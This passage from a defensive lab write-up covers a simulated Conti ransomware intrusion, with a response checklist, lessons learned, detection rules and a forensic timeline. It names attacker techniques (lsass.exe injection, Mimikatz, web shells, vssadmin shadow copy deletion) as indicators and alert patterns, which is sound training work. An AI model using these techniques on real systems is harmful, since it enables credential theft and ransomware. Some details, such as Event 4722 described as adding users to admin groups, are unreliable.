  ☐ Disable internet access to prevent ransom payment

Priority 2: PRESERVE EVIDENCE
  ☐ DO NOT reboot any systems (data in memory)
  ☐ Collect memory dumps of running processes
  ☐ Preserve Exchange server for forensics
  ☐ Capture HTTP access logs
  ☐ Preserve Windows Event Logs
  ☐ Image affected systems (if possible)

Priority 3: NOTIFY KEY STAKEHOLDERS
  ☐ Notify C-level executives (incident occurring)
  ☐ Notify security team (activate IR plan)
  ☐ Notify legal (potential regulatory notification)
  ☐ Notify HR (breach communication)
```

### SHORT TERM (First Hour)

```
Priority 4: ASSESS DAMAGE SCOPE
  ☐ Determine which systems are encrypted
  ☐ Check for other web shells on Exchange
  ☐ Check for other backdoor accounts
  ☐ Check for additional malware/indicators
  ☐ Estimate amount of data encrypted/exfiltrated

Priority 5: CREDENTIAL COMPROMISE RESPONSE
  ☐ FORCE password reset for ALL domain users (now)
  ☐ FORCE password reset for ALL service accounts
  ☐ FORCE password reset for ALL admin accounts
  ☐ Assume ALL credentials are compromised
  ☐ Reset all API keys and secrets

Priority 6: DELETE BACKDOORS
  ☐ Delete securityninja user account
  ☐ Delete i3efPctK1cz4.aspx web shell file
  ☐ Terminate lsass.exe injection processes
  ☐ Remove malicious registry entries
  ☐ DO NOT reboot (might trigger persistence)
```

### MEDIUM TERM (Hours 2-8)

```
Priority 7: THREAT HUNT
  ☐ Search for other web shells in Exchange directories
  ☐ Search for other backdoor user accounts
  ☐ Search for Mimikatz/Procdump artifacts
  ☐ Search for PowerView scripts
  ☐ Check for lateral movement indicators
  ☐ Review all recent admin account activity

Priority 8: INVESTIGATE INITIAL ACCESS
  ☐ Determine how attacker got in initially
  ☐ Review email gateway logs (phishing)
  ☐ Review VPN access logs (compromised credentials)
  ☐ Review vulnerability scan results (unpatched systems)
  ☐ Review firewall logs (external access)

Priority 9: DOMAIN REBUILD PREPARATION
  ☐ Begin planning full domain recovery
  ☐ Prepare for system rebuilds
  ☐ Backup domain database (for recovery)
  ☐ Document all domain objects (for rebuilding)
  ☐ Prepare offline recovery media

Priority 10: RANSOMWARE ANALYSIS
  ☐ Extract ransomware binary
  ☐ Analyze in isolated lab environment
  ☐ Identify encryption method
  ☐ Determine if weakness exists
  ☐ Check if decryption possible without ransom
```

### LONG TERM (Days 2+)

```
Priority 11: FULL SYSTEM REBUILD
  ☐ Rebuild domain controllers (clean OS)
  ☐ Rebuild Exchange server (clean OS)
  ☐ Rebuild file servers (clean OS)
  ☐ Rebuild all workstations (clean OS)
  ☐ Do NOT restore from backups until verified clean

Priority 12: DATA RECOVERY
  ☐ Recover clean backups (if available)
  ☐ Restore non-encrypted user data
  ☐ Verify all restored data is clean
  ☐ Gradually bring systems back online

Priority 13: SECURITY HARDENING
  ☐ Apply all security patches
  ☐ Implement EDR/XDR tools
  ☐ Deploy MFA organization-wide
  ☐ Strengthen Exchange security
  ☐ Enable advanced audit logging

Priority 14: EXTERNAL REPORTING
  ☐ Notify law enforcement (FBI)
  ☐ Report to regulatory bodies (if required)
  ☐ Notify data breach victims (if applicable)
  ☐ Prepare public statement
  ☐ Coordinate with legal/PR
```

---

## 📈 Lessons Learned

### Technical Lessons

```
1. PROCESS INJECTION IS CRITICAL INDICATOR
   - Monitor Sysmon Event 8 aggressively
   - Alert on injection into critical processes
   - Injection into lsass.exe = immediate escalation

2. CREDENTIAL THEFT IS GAME OVER
   - Once lsass.exe is compromised, domain is compromised
   - Domain admin credentials = full network access
   - Must assume all credentials stolen

3. WEB SHELLS ARE PERSISTENT
   - File-based persistence (no process)
   - Survives reboots/tool scans
   - Hard to detect without file scanning
   - Need centralized file monitoring

4. MULTIPLE PERSISTENCE MECHANISMS
   - Attacker deployed 3 persistence layers:
     * Backdoor user account
     * Web shell file
     * Process injection in lsass.exe
   - Removing one doesn't stop attacker
   - Must find and remove ALL simultaneously

5. RANSOMWARE SPEED IS SHOCKING
   - 30 minutes from access to encryption
   - Complete domain compromise in that time
   - No time for manual response
   - Need automation for incident response
```

### Operational Lessons

```
1. REAL-TIME MONITORING IS ESSENTIAL
   - Splunk + Sysmon detected events as they happened
   - Logs provided complete attack reconstruction
   - Without logs, would be forensic-only investigation
   - Implement centralized logging NOW

2. EVENT CORRELATION MATTERS
   - Process Creation (Event 1) alone not suspicious
   - Process Injection (Event 8) alone suspicious but unclear
   - File Creation (Event 11) alone could be normal
   - Combined: 1 + 8 + 11 + 4720 = CLEAR attack pattern

3. CREDENTIAL REUSE IS DANGEROUS
   - Admin credentials were compromised
   - Used for lateral movement
   - Need MFA on all privileged accounts
   - Need account separation (admin != user account)

4. BACKUPS ARE CRITICAL
   - Shadow copies were deleted
   - Offline backups essential
   - Test backup restoration regularly
   - Backup systems need protection too

5. PATCHING CAN'T WAIT
   - Initial access likely via known CVE
   - All systems should be patched
   - Exchange had known vulnerabilities
   - Patch management is life-or-death
```

---

## 🔐 Defense Recommendations

### Prevent Initial Access
```
- Apply all security patches immediately
- Implement web application firewall (WAF) for Exchange
- Restrict external Exchange access (no Outlook Web Access if possible)
- Implement MFA for all external access
- Monitor for known vulnerability exploitation
- Conduct regular vulnerability scanning
```

### Detect Early (Prevent Spread)
```
- Monitor Sysmon Event 8 (process injection)
  Alert on: injection into lsass.exe, svchost.exe, explorer.exe
  
- Monitor Sysmon Event 11 (file creation)
  Alert on: massive file creation clusters
  Alert on: readme.txt or ransom note patterns
  
- Monitor Windows Event 4663 (file access)
  Alert on: thousands of file modifications in short time
  Alert on: files changing extensions
  
- Monitor HTTP logs
  Alert on: unusual .aspx file access
  Alert on: POST requests to Exchange directories
  Alert on: .aspx files created by non-admin users
  
- Monitor Account Creation
  Alert on: Event 4720 for unexpected new accounts
  Alert on: Event 4722 adding users to admin groups
  
- Monitor Shadow Copy Deletion
  Alert on: vssadmin.exe execution
  Alert on: Event 26 (file deletion) from System Volume Information
```

### Respond Quickly
```
- Have playbooks ready for:
  * Ransomware detection
  * Credential compromise
  * Web shell detection
  * Lateral movement indicators
  
- Automate response actions:
  * Automatic network isolation
  * Automatic credential reset (for high-risk accounts)
  * Automatic alert escalation
  * Automatic log preservation

- Practice incident response:
  * Tabletop exercises
  * Breach simulations
  * Ransomware drills
```

---

## 📚 References & Resources

| Resource | Link | Purpose |
|---|---|---|
| MITRE ATT&CK | https://attack.mitre.org/ | Technique framework |
| Conti Ransomware | https://www.cisa.gov/news-events/alerts/2021/09/22/conti-ransomware-malware-analysis-report | Official analysis |
| Sysmon Documentation | https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon | Event ID reference |
| Windows Event IDs | https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ | Event reference |
| Process Injection | https://attack.mitre.org/techniques/T1055/ | Injection techniques |
| LSASS Dumping | https://attack.mitre.org/techniques/T1003/001/ | Credential theft |
| Web Shells | https://attack.mitre.org/techniques/T1505/003/ | Web shell techniques |

---

## 🎓 Forensic Timeline Summary

```
PHASE 1: INITIAL ACCESS
  Status: UNKNOWN
  Vector: CVE or Phishing
  Evidence: Inferred only
  
PHASE 2: MALWARE EXECUTION
  Status: CONFIRMED
  Evidence: Sysmon Event 1 (cmd.exe from Documents)
  Time: 2021-09-08 19:50:00 UTC
  
PHASE 3: PRIVILEGE ESCALATION (Process Injection)
  Status: CONFIRMED
  Evidence: Sysmon Event 8 (unsecapp.exe → lsass.exe)
  Time: 2021-09-08 19:55:30 UTC
  
PHASE 4: CREDENTIAL EXTRACTION
  Status: INFERRED
  Evidence: Injection into lsass.exe
  Techniques: Likely Mimikatz
  Impact: Domain admin credentials stolen
  
PHASE 5: WEB SHELL DEPLOYMENT
  Status: CONFIRMED
  Evidence: HTTP logs (i3efPctK1cz4.aspx)
  Time: 2021-09-08 19:52:15 UTC (first access)
  File: C:\...\Exchange\...\owa\auth\i3efPctK1cz4.aspx
  
PHASE 6: PERSISTENCE SETUP
  Status: CONFIRMED
  Evidence 1: Event 4720 (securityninja user created)
  Evidence 2: Event 4722 (user added to admin group)
  Evidence 3: HTTP logs (attrib.exe -r web shell)
  Time: 2021-09-08 19:50:05 - 19:56:30 UTC
  
PHASE 7: RANSOMWARE DEPLOYMENT
  Status: CONFIRMED
  Evidence: Sysmon Event 11 (18 readme.txt files created)
  Time: 2021-09-08 19:57:00 UTC
  Scope: 18 user directories affected
  
PHASE 8: RECOVERY PREVENTION
  Status: CONFIRMED
  Evidence: Sysmon Event 26 (shadow copy deletion)
  Time: 2021-09-08 19:58:00 UTC
  Impact: No offline recovery possible
  
PHASE 9: FILE ENCRYPTION
  Status: INFERRED
  Evidence: Ransom notes indicate encryption occurred
  Time: 2021-09-08 19:59:00+ UTC
  Impact: Files encrypted with .conti extension
  
PHASE 10: LONG-TERM ACCESS
  Status: PERSISTENT
  Mechanisms:
    - securityninja RDP account
    - i3efPctK1cz4.aspx web shell
    - Injected lsass.exe code
```

---

*Writeup by: Moetez Bouchlaghem*
*SOC-Investigation-Lab | GhnimiWael*
*Lab Source: https://tryhackme.com/room/contiransomwarehgh*
*Investigation Date: June 20, 2026*
